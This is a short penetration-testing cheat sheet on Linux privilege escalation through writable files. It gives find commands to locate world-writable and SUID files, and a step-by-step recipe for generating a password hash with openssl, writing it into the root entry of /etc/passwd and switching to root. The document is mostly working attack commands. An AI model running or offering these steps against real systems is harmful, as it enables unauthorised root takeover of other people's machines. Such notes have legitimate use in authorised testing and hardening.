# Writeable Files

Here is common example of writeable files and their potential exploitation.

```bash
find / -type f -writable -exec ls -l {} \; 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

## /etc/passwd

In case you have write access to `/etc/passwd`, you can add a password to the root user and then login as root.

```bash
openssl passwd <password>
# $1$eMFFC8pU$KCTHmfmr9jrJX.OoMl8wo1
```

Then add the password hash to the root user in `/etc/passwd`.

```bash
root:$1$eMFFC8pU$KCTHmfmr9jrJX.OoMl8wo1:0:0:root:/root:/bin/bash"
```

Now we cann login as root with the password we set before.

```bash
su root
```